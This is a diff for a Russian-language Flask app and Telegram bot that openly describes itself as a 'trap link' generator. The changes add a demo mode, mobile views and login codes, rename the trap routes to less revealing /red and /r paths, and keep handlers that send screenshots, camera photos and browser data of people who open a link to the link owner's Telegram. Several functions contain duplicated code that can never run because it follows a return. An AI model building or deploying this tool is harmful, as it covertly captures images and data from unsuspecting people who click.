                     document.getElementById('generatedLink').value = fullUrl;
                     document.getElementById('shortLink').value = shortUrl;
                     document.getElementById('linkResult').classList.add('active');
@@ -1504,7 +1918,7 @@ GENERATOR_HTML = """<!DOCTYPE html>
                     },
                     body: JSON.stringify({ 
                         link: link,
-                        name: document.getElementById('linkName').value || 'Без названия'
+                        name: currentGeneratedName
                     })
                 });
                 
@@ -1569,6 +1983,19 @@ GENERATOR_HTML = """<!DOCTYPE html>
                 showNotification('Ошибка выхода из системы', 'error');
             }
         }
+
+        async function checkDashboardSession() {
+            try {
+                const response = await fetch('/api/check-auth');
+                if (!response.ok) return;
+                const data = await response.json();
+                if (data.demo_expired || !data.authenticated) {
+                    window.location.href = '/login';
+                }
+            } catch (error) {
+                console.error('Ошибка проверки сессии:', error);
+            }
+        }
         
         // Загрузка данных при старте
         document.addEventListener('DOMContentLoaded', async () => {
@@ -1576,6 +2003,7 @@ GENERATOR_HTML = """<!DOCTYPE html>
             
             // Автообновление каждые 30 секунд
             setInterval(loadStats, 30000);
+            setInterval(checkDashboardSession, 5000);
         });
     </script>
 </body>
@@ -1835,10 +2263,160 @@ TRAP_HTML = """<!DOCTYPE html>
 
 # ========== FLASK МАРШРУТЫ ==========
 
+def get_dashboard_template(mobile=False):
+    """Return desktop or mobile dashboard template."""
+    if not mobile:
+        return GENERATOR_HTML
+
+    template = GENERATOR_HTML.replace('<body>', '<body class="mobile-view">', 1)
+    template = template.replace('<div class="container">', '<div class="container mobile-container">', 1)
+    template = template.replace(
+        '</style>',
+        '''
+        .mobile-view {
+            padding: 10px;
+        }
+
+        .mobile-container {
+            max-width: 560px;
+            padding: 22px;
+        }
+
+        .mobile-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            border-radius: 999px;
+            background: rgba(14, 165, 233, 0.12);
+            color: #0f3d63;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            margin: 0 auto 16px;
+        }
+
+        @media (max-width: 700px) {
+            .mobile-view .header {
+                padding: 16px;
+                border-radius: 18px;
+                gap: 14px;
+            }
+
+            .mobile-view .container {
+                padding: 18px;
+                border-radius: 22px;
+            }
+
+            .mobile-view h1 {
+                font-size: 2em;
+            }
+
+            .mobile-view .subtitle {
+                margin-bottom: 24px;
+                font-size: 0.98em;
+            }
+
+            .mobile-view .stats {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .mobile-view .link-item {
+                gap: 14px;
+            }
+
+            .mobile-view .link-item > div:last-child {
+                display: flex;
+                gap: 8px;
+                width: 100%;
+            }
+
+            .mobile-view .link-item > div:last-child button {
+                flex: 1;
+                margin: 0;
+            }
+
+            .mobile-view .notification {
+                left: 12px;
+                right: 12px;
+                bottom: 12px;
+            }
+        }
+        </style>''',
+        1
+    )
+    template = template.replace(
+        '<p class="subtitle">',
+        '<div class="mobile-badge">Mobile Dashboard</div><p class="subtitle">',
+        1
+    )
+    return template
+
+def render_dashboard(mobile=False):
+    """Render dashboard with shared user/session data."""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return redirect(url_for('login_page'))
+
+    user_id = session['user_id']
+    user = get_user_by_id(user_id)
+
+    if not user:
+        session.clear()
+        return redirect(url_for('login_page'))
+
+    initials = ""
+    if user['first_name']:
+        initials += user['first_name'][0].upper()
+    if user['last_name']:
+        initials += user['last_name'][0].upper()
+    if not initials and user['username']:
+        initials = user['username'][0].upper()
+
+    full_name = f"{user['first_name'] or ''} {user['last_name'] or ''}".strip()
+    if not full_name and user['username']:
+        full_name = f"@{user['username']}"
+    if session.get('demo_mode'):
+        full_name = "Demo Mode"
+
+    user_data = {
+        'id': user['user_id'],
+        'chat_id': user['chat_id'],
+        'username': user['username'],
+        'first_name': user['first_name'],
+        'last_name': user['last_name'],
+        'full_name': full_name,
+        'initials': initials[:2]
+    }
+
+    if session.get('demo_mode'):
+        expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+        session_expiry = expires_at.strftime('%d.%m.%Y %H:%M') if expires_at else 'Soon'
+    else:
+        session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
+
+    return render_template_string(
+        get_dashboard_template(mobile=mobile),
+        user_name=full_name,
+        user_initials=initials[:2],
+        user_data=user_data,
+        base_url=NGROK_URL,
+        session_expiry=session_expiry
+    )
+
 @app.route('/')
 @login_required
 def index():
+    if is_mobile_request():
+        return redirect(url_for('mobile_dashboard'))
+    return render_dashboard(mobile=False)
     """Главная страница генератора"""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return redirect(url_for('login_page'))
+
     user_id = session['user_id']
     user = get_user_by_id(user_id)
     
@@ -1859,6 +2437,8 @@ def index():
     full_name = f"{user['first_name'] or ''} {user['last_name'] or ''}".strip()
     if not full_name and user['username']:
         full_name = f"@{user['username']}"
+    if session.get('demo_mode'):
+        full_name = "Demo Mode"
     
     user_data = {
         'id': user['user_id'],
@@ -1871,7 +2451,11 @@ def index():
     }
     
     # Дата истечения сессии (90 дней от текущей даты)
-    session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
+    if session.get('demo_mode'):
+        expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+        session_expiry = expires_at.strftime('%d.%m.%Y %H:%M') if expires_at else 'скоро'
+    else:
+        session_expiry = (datetime.datetime.now() + datetime.timedelta(days=90)).strftime('%d.%m.%Y')
     
     return render_template_string(
         GENERATOR_HTML,
@@ -1882,10 +2466,17 @@ def index():
         session_expiry=session_expiry
     )
 
+@app.route('/mobile')
+@login_required
+def mobile_dashboard():
+    return render_dashboard(mobile=True)
+
 @app.route('/login')
 def login_page():
     """Страница входа через Telegram"""
     # Проверяем, не авторизован ли уже пользователь
+    if is_demo_session_expired():
+        clear_demo_session()
     if 'user_id' in session:
         return redirect(url_for('index'))
     
@@ -1918,7 +2509,9 @@ def login_page():
             LOGIN_HTML,
             bot_username=bot_username,
             qr_code_url=qr_code_url,
-            base_url=NGROK_URL
+            base_url=NGROK_URL,
+            demo_minutes=DEMO_SESSION_MINUTES,
+            login_code_minutes=LOGIN_CODE_EXPIRE_MINUTES
         )
     except Exception as e:
         print(f"Ошибка при получении информации о боте: {e}")
@@ -1928,6 +2521,7 @@ def login_page():
 def debug():
     return "Сервер работает!"
 
+@app.route('/red/<link_id>')
 @app.route('/trap/<link_id>')
 def trap_page(link_id):
     """Страница ловушки - делает скриншот и фото"""
@@ -1949,7 +2543,7 @@ def trap_page(link_id):
     
     # Отправляем уведомление в Telegram владельцу
     user = get_user_by_id(link['user_id'])
-    if user:
+    if user and user.get('chat_id'):
         send_telegram_click_notification(
             user['chat_id'],
             link_id,
@@ -1966,8 +2560,10 @@ def trap_page(link_id):
         redirect_url=link['redirect_url']
     )
 
+@app.route('/r/<link_id>')
 @app.route('/s/<link_id>')
 def short_link_redirect(link_id):
+    return redirect(f"/red/{link_id}") if get_link(link_id) else ("Link not found", 404)
     """Короткая ссылка для ловушки"""
     # Получаем информацию о ссылке
     link = get_link(link_id)
@@ -1987,7 +2583,7 @@ def short_link_redirect(link_id):
     
     # Отправляем уведомление в Telegram владельцу
     user = get_user_by_id(link['user_id'])
-    if user:
+    if user and user.get('chat_id'):
         send_telegram_click_notification(
             user['chat_id'],
             link_id,
@@ -1998,14 +2594,22 @@ def short_link_redirect(link_id):
         )
     
     # Перенаправляем на полную версию ловушки
-    return redirect(url_for('trap_page', link_id=link_id))
+    return redirect(f"/red/{link_id}")
 
 @app.route('/api/check-auth')
 def api_check_auth():
     """Проверка авторизации"""
+    if is_demo_session_expired():
+        clear_demo_session()
+        return jsonify({'authenticated': False, 'waiting': False, 'demo_expired': True})
+
     user_id = session.get('user_id')
     if user_id:
-        return jsonify({'authenticated': True})
+        return jsonify({
+            'authenticated': True,
+            'demo_mode': bool(session.get('demo_mode')),
+            'demo_expires_at': session.get('demo_expires_at')
+        })
     
     # Проверяем постоянную сессию
     persistent_session_id = request.cookies.get('persistent_session')
@@ -2023,12 +2627,69 @@ def api_check_auth():
     
     return jsonify({'authenticated': False, 'waiting': False})
 
+@app.route('/api/start-demo', methods=['POST'])
+def api_start_demo():
+    """Запуск ознакомительного режима."""
+    expires_at = activate_demo_session()
+    return jsonify({
+        'success': True,
+        'expires_at': expires_at.isoformat(),
+        'redirect_url': url_for('index')
+    })
+
+@app.route('/api/login-with-code', methods=['POST'])
+def api_login_with_code():
+    """Вход по одноразовому коду из Telegram."""
+    data = request.json or {}
+    code = str(data.get('code', '')).strip().upper()
+
+    if not code:
+        return jsonify({'success': False, 'error': 'Введите код'}), 400
+
+    login_code = get_login_code(code)
+    if not login_code:
+        return jsonify({'success': False, 'error': 'Код недействителен или истек'}), 401
+
+    telegram_data = json.loads(login_code['telegram_data'])
+    user_id = create_or_update_user(
+        telegram_data['chat_id'],
+        telegram_data['username'],
+        telegram_data['first_name'],
+        telegram_data['last_name']
+    )
+
+    session.clear()
+    session['user_id'] = user_id
+    session['chat_id'] = telegram_data['chat_id']
+    session['username'] = telegram_data['username']
+    session['first_name'] = telegram_data['first_name']
+    session['last_name'] = telegram_data['last_name']
+    session.permanent = True
+
+    auth_token = generate_auth_token(user_id)
+    user_agent = request.headers.get('User-Agent', '')
+    ip_address = request.remote_addr
+    persistent_session_id = create_persistent_session(user_id, user_agent, ip_address)
+    mark_login_code_used(code)
+
+    response = jsonify({'success': True, 'redirect_url': url_for('index')})
+    response.set_cookie('persistent_session', persistent_session_id, max_age=60*60*24*90, httponly=True, secure=False, samesite='Lax')
+    response.set_cookie('auth_token', auth_token, max_age=60*60*24*90, httponly=True, secure=False, samesite='Lax')
+    return response
+
 @app.route('/api/logout', methods=['POST'])
 @login_required
 def api_logout():
     """Выход из системы"""
     data = request.json or {}
     logout_everywhere = data.get('logout_everywhere', False)
+
+    if session.get('demo_mode'):
+        clear_demo_session()
+        response = jsonify({'success': True})
+        response.set_cookie('persistent_session', '', expires=0)
+        response.set_cookie('auth_token', '', expires=0)
+        return response
     
     user_id = session['user_id']
     
@@ -2085,6 +2746,8 @@ def api_send_link_telegram():
         
         if not user:
             return jsonify({'success': False, 'error': 'User not found'}), 401
+        if session.get('demo_mode') or not user.get('chat_id'):
+            return jsonify({'success': False, 'error': 'Telegram недоступен в ознакомительном режиме'}), 403
         
         data = request.json
         link = data.get('link')
@@ -2110,7 +2773,7 @@ def api_info():
             link = get_link(trap_id)
             if link:
                 user = get_user_by_id(link['user_id'])
-                if user:
+                if user and user.get('chat_id'):
                     # Отправляем информацию о браузере в Telegram
                     send_telegram_browser_info(user['chat_id'], trap_id, data)
         
@@ -2148,7 +2811,7 @@ def api_upload():
             link = get_link(trap_id)
             if link:
                 user = get_user_by_id(link['user_id'])
-                if user:
+                if user and user.get('chat_id'):
                     send_telegram_image(
                         user['chat_id'], 
                         trap_id, 
@@ -2177,7 +2840,7 @@ def api_report():
             link = get_link(trap_id)
             if link:
                 user = get_user_by_id(link['user_id'])
-                if user:
+                if user and user.get('chat_id'):
                     send_telegram_capture_report(
                         user['chat_id'],
                         trap_id,
@@ -2255,23 +2918,32 @@ def api_create_link():
         # Проверяем URL
         if not redirect_url.startswith(('http://', 'https://')):
             redirect_url = 'https://' + redirect_url
+        expires_minutes = DEMO_LINK_EXPIRY_MINUTES if session.get('demo_mode') else None
+        expires_at = datetime.datetime.now() + (
+            datetime.timedelta(minutes=DEMO_LINK_EXPIRY_MINUTES)
+            if session.get('demo_mode')
+            else datetime.timedelta(hours=LINK_EXPIRY_HOURS)
+        )
         
         # Создаем ссылку в базе
-        create_link(user_id, link_id, name, redirect_url)
+        create_link(user_id, link_id, name, redirect_url, expires_minutes=expires_minutes)
         
         # Полные URL
-        full_url = f"{NGROK_URL}/trap/{link_id}"
-        short_url = f"{NGROK_URL}/s/{link_id}"
+        full_url = f"{NGROK_URL}/red/{link_id}"
+        short_url = f"{NGROK_URL}/r/{link_id}"
         
         # Отправляем уведомление в Telegram пользователя
-        send_telegram_link_created(user['chat_id'], link_id, name, full_url)
+        if not session.get('demo_mode') and user.get('chat_id'):
+            send_telegram_link_created(user['chat_id'], link_id, name, full_url)
         
         return jsonify({
             'success': True,
             'id': link_id,
             'full_url': full_url,
             'short_url': short_url,
-            'name': name
+            'name': name,
+            'expires_at': expires_at.isoformat(),
+            'demo_mode': bool(session.get('demo_mode'))
         })
     except Exception as e:
         print(f"Ошибка создания ссылки: {e}")
@@ -2549,6 +3221,68 @@ def send_telegram_link_message(chat_id, link, name):
         print(f"Ошибка отправки ссылки: {e}")
         return False
 
+def send_login_link(chat_id, user_id_db, telegram_data):
+    """Отправка ссылки для входа на сайт."""
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
+
+    session_id = create_session(user_id_db, telegram_data)
+    login_url = f"{NGROK_URL}/api/telegram-login/{session_id}"
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🌐 Перейти на сайт", url=login_url))
+
+    instructions = (
+        f"🔐 *Вход по ссылке*\n\n"
+        f"1. Нажмите кнопку ниже\n"
+        f"2. Или откройте ссылку вручную:\n"
+        f"`{login_url}`\n\n"
+        f"Ссылка действует {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    send_telegram_qr_code(chat_id, login_url, "QR-код для входа на сайт")
+
+def send_login_code_message(chat_id, user_id_db, telegram_data):
+    """Отправка одноразового кода для входа."""
+    code = create_login_code(user_id_db, telegram_data)
+    message = (
+        f"🔑 *Вход по коду*\n\n"
+        f"Ваш код: `{code}`\n\n"
+        f"Введите его на странице входа на сайте.\n"
+        f"Код действует {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+    bot.send_message(chat_id, message, parse_mode='Markdown')
+
 # ========== TELEGRAM БОТ КОМАНДЫ ==========
 
 @bot.message_handler(commands=['start', 'help'])
@@ -2562,6 +3296,51 @@ def send_welcome(message):
     
     # Регистрируем/обновляем пользователя
     user_id_db = create_or_update_user(chat_id, username, first_name, last_name)
+
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔐 Войти на сайт")
+    markup.add("📋 Мои ссылки")
+    markup.add("ℹ️ Помощь")
+
+    welcome_text = (
+        f"👋 Привет, {first_name or 'пользователь'}!\n\n"
+        f"🤖 Я бот для генерации ссылок-ловушек.\n\n"
+        f"📋 *Что я умею:*\n"
+        f"• Создавать уникальные ссылки\n"
+        f"• Делать скриншот при переходе\n"
+        f"• Делать фото с камеры (если доступно)\n"
+        f"• Отправлять всё прямо сюда\n\n"
+        f"🔐 *Чтобы начать:*\n"
+        f"1. Нажмите кнопку 'Войти на сайт'\n"
+        f"2. Выберите вход по ссылке или по коду\n"
+        f"3. Откройте сайт в браузере и подтвердите вход\n\n"
+        f"🌐 *Сайт:* {NGROK_URL}\n"
+        f"🆔 *Ваш ID:* `{user_id_db}`"
+    )
+
+    bot.send_message(
+        chat_id,
+        welcome_text,
+        reply_markup=markup,
+        parse_mode='Markdown'
+    )
+    return
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
     
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🔐 Войти на сайт")
@@ -2578,8 +3357,8 @@ def send_welcome(message):
         f"• Отправлять всё прямо сюда\n\n"
         f"🔐 *Чтобы начать:*\n"
         f"1. Нажмите кнопку 'Войти на сайт'\n"
-        f"2. Я отправлю вам ссылку для входа\n"
-        f"3. Перейдите по ссылке в браузере\n\n"
+        f"2. Выберите вход по ссылке или по коду\n"
+        f"3. Откройте сайт в браузере и подтвердите вход\n\n"
         f"🌐 *Сайт:* {NGROK_URL}\n"
         f"🆔 *Ваш ID:* `{user_id_db}`"
     )
@@ -2611,7 +3390,23 @@ def login_to_website(message):
         'last_name': last_name,
         'chat_id': chat_id
     }
-    
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🔗 По ссылке", callback_data="login_method_link"),
+        types.InlineKeyboardButton("🔑 По коду", callback_data="login_method_code")
+    )
+
+    instructions = (
+        "🔐 *Выберите способ входа*\n\n"
+        "🔗 По ссылке: бот пришлет кнопку и QR-код.\n"
+        "🔑 По коду: бот пришлет одноразовый код, который нужно ввести на сайте.\n\n"
+        f"Оба варианта действуют {LOGIN_CODE_EXPIRE_MINUTES} минут."
+    )
+
+    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode='Markdown')
+    return
+
     session_id = create_session(user_id_db, telegram_data)
     
     # Ссылка для входа
@@ -2661,7 +3456,7 @@ def show_my_links(message):
     
     # Отправляем первую ссылку с кнопками
     link = links[0]
-    full_url = f"{NGROK_URL}/trap/{link['link_id']}"
+    full_url = f"{NGROK_URL}/red/{link['link_id']}"
     
     text = (
         f"🔗 *Ваша ссылка*\n\n"
@@ -2682,7 +3477,7 @@ def show_my_links(message):
     
     # Кнопка для просмотра следующей
     if len(links) > 1:
-        markup.add(types.InlineKeyboardButton("➡️ Следующая ссылка", callback_data=f"next_1"))
+        text += f"\n\nПоказана последняя ссылка из {len(links)}. Остальные доступны в веб-интерфейсе."
     
     bot.send_message(
         chat_id,
@@ -2691,6 +3486,27 @@ def show_my_links(message):
         parse_mode='Markdown'
     )
 
+@bot.callback_query_handler(func=lambda call: call.data in ('login_method_link', 'login_method_code'))
+def login_method_callback(call):
+    """Выбор способа входа на сайт."""
+    chat_id = call.message.chat.id
+    user = call.from_user
+    user_id_db = create_or_update_user(chat_id, user.username, user.first_name, user.last_name)
+    telegram_data = {
+        'id': user.id,
+        'username': user.username,
+        'first_name': user.first_name,
+        'last_name': user.last_name,
+        'chat_id': chat_id
+    }
+
+    if call.data == 'login_method_link':
+        send_login_link(chat_id, user_id_db, telegram_data)
+        bot.answer_callback_query(call.id, "Ссылка для входа отправлена")
+    else:
+        send_login_code_message(chat_id, user_id_db, telegram_data)
+        bot.answer_callback_query(call.id, "Код для входа отправлен")
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith('copy_'))
 def copy_link_callback(call):
     """Копирование ссылки"""
@@ -2698,7 +3514,7 @@ def copy_link_callback(call):
     link = get_link(link_id)
     
     if link:
-        full_url = f"{NGROK_URL}/trap/{link_id}"
+        full_url = f"{NGROK_URL}/red/{link_id}"
         bot.answer_callback_query(call.id, f"✅ Ссылка скопирована!\n{full_url[:30]}...", show_alert=False)
     else:
         bot.answer_callback_query(call.id, "❌ Ссылка не найдена", show_alert=True)
@@ -2710,7 +3526,7 @@ def qr_code_callback(call):
     link = get_link(link_id)
     
     if link:
-        full_url = f"{NGROK_URL}/trap/{link_id}"
+        full_url = f"{NGROK_URL}/red/{link_id}"
         send_telegram_qr_code(call.message.chat.id, full_url, f"QR-код для ссылки: {link['name'] or 'Без названия'}")
         bot.answer_callback_query(call.id, "✅ QR-код отправлен!")
     else:
@@ -2731,10 +3547,14 @@ def run_bot():
 if __name__ == '__main__':
     # Инициализация базы данных
     init_db()
+    cleanup_expired_links()
+    cleanup_expired_sessions()
     
     # Запуск бота в отдельном потоке
     bot_thread = Thread(target=run_bot, daemon=True)
     bot_thread.start()
+    cleanup_thread = Thread(target=background_cleanup_worker, daemon=True)
+    cleanup_thread.start()
     
     print("=" * 60)
     print("🕵️‍♂️ ГЕНЕРАТОР ССЫЛОК-ЛОВУШЕК С TELEGRAM АВТОРИЗАЦИЕЙ")
